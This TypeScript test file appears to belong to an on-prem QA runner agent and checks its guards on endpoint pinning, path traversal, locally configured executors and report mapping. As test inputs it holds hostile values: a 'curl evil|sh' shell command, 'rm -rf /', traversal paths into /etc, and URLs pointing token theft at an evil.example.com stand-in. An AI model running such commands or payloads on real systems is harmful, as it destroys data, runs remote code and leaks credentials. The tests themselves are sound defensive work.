/**
 * The four things an on-prem agent can do that a customer's security team
 * would never forgive, and the tests that stop it.
 *
 *  1. **Send the runner token somewhere else.** The endpoint is pinned once and
 *     every URL is built from it. The trailing-dot case is here because this
 *     codebase has already shipped that exact SSRF once — `https://localhost.`
 *     defeated an anchored hostname guard while resolving to the same address
 *     — and because a guard that is only tested with well-formed input is not
 *     tested.
 *
 *  2. **Write outside its workspace.** `filePath` arrives from the server, and
 *     it is the only server-controlled string this agent turns into a path.
 *     Traversal is asserted after normalisation, not by looking for `..`.
 *
 *  3. **Run something the server chose.** The executor's argv comes from the
 *     operator's local config. The test asserts that a job payload carrying a
 *     `command` field changes nothing about what is spawned.
 *
 *  4. **Lose a test quietly.** A test the report never mentions must come back
 *     SKIPPED with a sentence, never dropped and never passed. Every "no
 *     report" path is asserted to produce a result per test, because the
 *     dangerous bug in a reporting agent is not a crash — it is a green run
 *     over tests that never executed.
 */

import { mkdtempSync, rmSync } from 'node:fs';
import { readFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  DEFAULT_EXECUTOR,
  RunnerError,
  backoffMs,
  browsersFromCacheEntries,
  decodeXml,
  executorFor,
  mapReport,
  materialiseWorkspace,
  parseJunitXml,
  parseRunnerConfig,
  pinEndpoint,
  resolveWorkspacePath,
  spawnExecutor,
} from './runner.js';

// ─── 1. The pinned endpoint ──────────────────────────────────────────────────

describe('pinEndpoint', () => {
  it('accepts an https origin and freezes it', () => {
    const endpoint = pinEndpoint('https://qaai.acme.com/');
    expect(endpoint.origin).toBe('https://qaai.acme.com');
    expect(endpoint.url('/runners/agent/claim')).toBe('https://qaai.acme.com/runners/agent/claim');
  });

  it('keeps a non-default port', () => {
    expect(pinEndpoint('https://qaai.acme.com:8443').origin).toBe('https://qaai.acme.com:8443');
  });

  it('refuses plain http off the loopback', () => {
    expect(() => pinEndpoint('http://qaai.acme.com')).toThrow(/must be https/i);
  });

  it('allows http on loopback, where the token cannot leave the machine', () => {
    expect(pinEndpoint('http://localhost:4000').origin).toBe('http://localhost:4000');
    expect(pinEndpoint('http://127.0.0.1:4000').origin).toBe('http://127.0.0.1:4000');
  });

  it('strips a trailing dot before deciding anything', () => {
    // `https://localhost./x` resolves exactly like `https://localhost/x`. The
    // normalisation has to happen BEFORE the loopback test, or one character
    // changes the answer.
    const endpoint = pinEndpoint('http://localhost.:4000');
    expect(endpoint.host).toBe('localhost');
    expect(endpoint.url('/x')).toBe('http://localhost:4000/x');
  });

  it('refuses a trailing-dot host that would otherwise be rejected as non-https', () => {
    expect(() => pinEndpoint('http://qaai.acme.com.')).toThrow(/must be https/i);
  });

  it('refuses credentials embedded in the URL', () => {
    expect(() => pinEndpoint('https://user:qaai_rt_secret@qaai.acme.com')).toThrow(/credentials/i);
  });

  it('does not echo an unparseable URL back, in case it carried a token', () => {
    let message = '';
    try {
      pinEndpoint('https://user:qaai_rt_leaked@ not a url');
    } catch (err) {
      message = (err as Error).message;
    }
    expect(message).not.toContain('qaai_rt_leaked');
  });

  it('refuses to build a URL from anything but a path', () => {
    const endpoint = pinEndpoint('https://qaai.acme.com');
    expect(() => endpoint.url('https://evil.example.com/steal')).toThrow(RunnerError);
    expect(() => endpoint.url('//evil.example.com/steal')).toThrow(/host other than the pinned/i);
  });
});

// ─── 2. The workspace ────────────────────────────────────────────────────────

describe('resolveWorkspacePath', () => {
  const root = '/tmp/qaai-workspace';

  it('resolves a normal relative path inside the root', () => {
    expect(resolveWorkspacePath(root, 'tests/login.spec.ts')).toBe(
      join(root, 'tests', 'login.spec.ts'),
    );
  });

  it('refuses a path that escapes after normalisation', () => {
    expect(() => resolveWorkspacePath(root, '../../etc/cron.d/pwn')).toThrow(/escapes/i);
    expect(() => resolveWorkspacePath(root, 'a/b/../../../outside.ts')).toThrow(/escapes/i);
  });

  it('refuses an absolute path', () => {
    expect(() => resolveWorkspacePath(root, '/etc/passwd')).toThrow(/absolute/i);
    expect(() => resolveWorkspacePath(root, 'C:\\Windows\\System32\\x')).toThrow(/absolute/i);
  });

  it('refuses a null byte', () => {
    expect(() => resolveWorkspacePath(root, 'tests/a\0.ts')).toThrow(/null byte/i);
  });

  it('does not mistake a leading-dots filename for traversal', () => {
    expect(resolveWorkspacePath(root, '..hidden.spec.ts')).toBe(join(root, '..hidden.spec.ts'));
  });
});

describe('materialiseWorkspace', () => {
  let root = '';

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), 'qaai-runner-'));
  });
  afterEach(() => {
    rmSync(root, { recursive: true, force: true });
  });

  it('writes specs and fixtures where the report mapping expects them', async () => {
    const byPath = await materialiseWorkspace(root, {
      tests: [
        {
          id: 't1',
          name: 'logs in',
          type: 'E2E',
          code: 'export const x = 1;',
          filePath: 'tests/login.spec.ts',
          spec: null,
          timeoutMs: 1000,
          quarantined: false,
          tags: [],
        },
      ],
      fixtures: { 'fixtures/users.json': '{"a":1}' },
    });

    expect(byPath.get('tests/login.spec.ts')).toBe('t1');
    expect(await readFile(join(root, 'tests', 'login.spec.ts'), 'utf8')).toBe('export const x = 1;');
    expect(await readFile(join(root, 'fixtures', 'users.json'), 'utf8')).toBe('{"a":1}');
  });

  it('refuses a job whose spec would be written outside the workspace', async () => {
    await expect(
      materialiseWorkspace(root, {
        tests: [
          {
            id: 't1',
            name: 'evil',
            type: 'E2E',
            code: 'rm -rf /',
            filePath: '../../../../etc/profile.d/pwn.sh',
            spec: null,
            timeoutMs: 1000,
            quarantined: false,
            tags: [],
          },
        ],
        fixtures: {},
      }),
    ).rejects.toThrow(/escapes the workspace/i);
  });
});

// ─── 3. The executor comes from local config, never from the server ──────────

describe('parseRunnerConfig', () => {
  it('defaults to the Playwright executor', () => {
    const config = parseRunnerConfig({}, 'qaai-runner.json');
    expect(config.executors.default).toEqual(DEFAULT_EXECUTOR);
  });

  it('refuses a token stored beside the config', () => {
    expect(() => parseRunnerConfig({ token: 'qaai_rt_abc' }, 'qaai-runner.json')).toThrow(
      /QAAI_RUNNER_TOKEN/,
    );
  });

  it('requires an executor to name a binary and a report', () => {
    expect(() =>
      parseRunnerConfig({ executors: { default: { args: ['x'] } } }, 'c.json'),
    ).toThrow(/command/);
    expect(() =>
      parseRunnerConfig({ executors: { default: { command: 'npx' } } }, 'c.json'),
    ).toThrow(/report/);
  });

  it('picks a per-test-type executor when one is configured', () => {
    const config = parseRunnerConfig(
      {
        executors: {
          LOAD: { command: 'k6', args: ['run', 'script.js'], report: 'k6.xml' },
        },
      },
      'c.json',
    );
    expect(executorFor(config, ['LOAD']).command).toBe('k6');
    expect(executorFor(config, ['E2E']).command).toBe('npx');
  });

  it('ignores a command the server tried to supply', () => {
    /*
     * The shape a compromised or hostile server would send. It is not a field
     * this program reads from a job at all — the assertion is that the executor
     * is still whatever the operator configured.
     */
    const jobPayloadPretendingToBeConfig = { command: '/bin/sh', args: ['-c', 'curl evil|sh'] };
    const config = parseRunnerConfig({}, 'c.json');
    const chosen = executorFor(config, ['E2E']);
    expect(chosen.command).toBe('npx');
    expect(chosen.args).not.toContain(jobPayloadPretendingToBeConfig.args[0]);
  });
});

describe('spawnExecutor', () => {
  let root = '';

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), 'qaai-spawn-'));
  });
  afterEach(() => {
    rmSync(root, { recursive: true, force: true });
  });

  it('reports a missing binary as missing rather than as a failure', async () => {
    const outcome = await spawnExecutor(
      { command: 'qaai-definitely-not-installed', args: [], report: 'junit.xml' },
      root,
      {},
    );
    expect(outcome.missing).toBe(true);
  });

  it('does not hand its arguments to a shell', async () => {
    // With `shell: true` this would create the file. With `shell: false` — the
    // only mode this function has — `;` is just another argument to echo.
    const outcome = await spawnExecutor(
      { command: 'node', args: ['-e', 'process.stderr.write("ok")'], report: 'junit.xml' },
      root,
      { PATH: process.env.PATH ?? '' },
    );
    expect(outcome.missing).toBe(false);
    expect(outcome.stderr).toContain('ok');
  });
});

// ─── 4. Nothing is lost, and nothing is silently green ───────────────────────

describe('parseJunitXml', () => {
  it('reads passes, failures and skips', () => {
    const cases = parseJunitXml(`<?xml version="1.0"?>
      <testsuites>
        <testsuite name="s">
          <testcase name="logs in" classname="tests/login.spec.ts" time="1.5"/>
          <testcase name="checks out" file="tests/checkout.spec.ts" time="2">
            <failure message="expected 200, got 500">at checkout.spec.ts:12</failure>
          </testcase>
          <testcase name="ignored" file="tests/x.spec.ts"><skipped/></testcase>
        </testsuite>
      </testsuites>`);

    expect(cases).toHaveLength(3);
    expect(cases[0]).toMatchObject({ name: 'logs in', status: 'PASSED', durationMs: 1500 });
    expect(cases[1]).toMatchObject({ status: 'FAILED', message: 'expected 200, got 500' });
    expect(cases[2]?.status).toBe('SKIPPED');
  });

  it('decodes entities without double-decoding an escaped ampersand', () => {
    expect(decodeXml('a &amp;lt; b')).toBe('a &lt; b');
    expect(decodeXml('&lt;div&gt; &quot;x&quot; &#65;')).toBe('<div> "x" A');
  });

  it('returns nothing for a report it cannot read, rather than guessing', () => {
    expect(parseJunitXml('<html>500 Internal Server Error</html>')).toEqual([]);
    expect(parseJunitXml('')).toEqual([]);
  });
});

describe('mapReport', () => {
  const tests = [
    { id: 't1', name: 'logs in', filePath: 'tests/login.spec.ts' },
    { id: 't2', name: 'checks out', filePath: 'tests/checkout.spec.ts' },
  ];

  it('accounts for every test even when the report mentions none of them', () => {
    const reports = mapReport(tests, [], 'k6 is not installed on this runner host.');
    expect(reports).toHaveLength(2);
    for (const report of reports) {
      expect(report.status).toBe('SKIPPED');
      expect(report.errorMessage).toMatch(/not installed/);
    }
  });

  it('never reports a test as passed because the report was silent about it', () => {
    const reports = mapReport(
      tests,
      [{ name: 'logs in', classname: 'tests/login.spec.ts', file: '', durationMs: 10, status: 'PASSED', message: null, detail: null }],
      'no result was produced for this test',
    );
    expect(reports.find((r) => r.testId === 't1')?.status).toBe('PASSED');
    const missing = reports.find((r) => r.testId === 't2');
    expect(missing?.status).toBe('SKIPPED');
    expect(missing?.errorMessage).toBe('no result was produced for this test');
  });

  it('matches by file when the case name does not match a test name', () => {
    const reports = mapReport(
      tests,
      [{ name: 'suite > logs in', classname: '', file: 'tests/login.spec.ts', durationMs: 5, status: 'FAILED', message: 'boom', detail: 'stack' }],
      'note',
    );
    const failed = reports.find((r) => r.testId === 't1');
    expect(failed?.status).toBe('FAILED');
    expect(failed?.errorMessage).toBe('boom');
    expect(failed?.steps[0]?.error?.stack).toBe('stack');
  });

  it('treats a retry that passes as a flake candidate, not a pass', () => {
    // §5: a retry that passes is NOT a pass. Overwriting the failure would hide
    // exactly the intermittency the product exists to surface.
    const reports = mapReport(
      [tests[0]!],
      [
        { name: 'logs in', classname: '', file: 'tests/login.spec.ts', durationMs: 10, status: 'FAILED', message: 'flaked', detail: null },
        { name: 'logs in', classname: '', file: 'tests/login.spec.ts', durationMs: 12, status: 'PASSED', message: null, detail: null },
      ],
      'note',
    );
    expect(reports[0]?.status).toBe('PASSED');
    expect(reports[0]?.retriedAndPassed).toBe(true);
    expect(reports[0]?.durationMs).toBe(22);
  });

  it('drops a case for a test it was not given', () => {
    const reports = mapReport(
      [tests[0]!],
      [{ name: 'somebody elses test', classname: 'other.spec.ts', file: '', durationMs: 1, status: 'PASSED', message: null, detail: null }],
      'note',
    );
    expect(reports).toHaveLength(1);
    expect(reports[0]?.testId).toBe('t1');
    expect(reports[0]?.status).toBe('SKIPPED');
  });
});

// ─── Supporting behaviour ────────────────────────────────────────────────────

describe('browsersFromCacheEntries', () => {
  it('recognises the Playwright cache layout', () => {
    expect(
      browsersFromCacheEntries([
        'chromium-1140',
        'chromium_headless_shell-1140',
        'firefox-1465',
        '.links',
        'ffmpeg-1011',
      ]).sort(),
    ).toEqual(['chromium', 'firefox']);
  });

  it('reports nothing when no browser is installed', () => {
    expect(browsersFromCacheEntries([])).toEqual([]);
  });
});

describe('backoffMs', () => {
  it('grows, jitters and stops growing', () => {
    // Full jitter: a fleet that lost the API during a deploy must not come back
    // in lockstep and hold it down.
    expect(backoffMs(1, () => 0)).toBe(500);
    expect(backoffMs(1, () => 1)).toBe(1000);
    expect(backoffMs(4, () => 0)).toBe(4000);
    expect(backoffMs(50, () => 1)).toBe(30_000);
  });
});
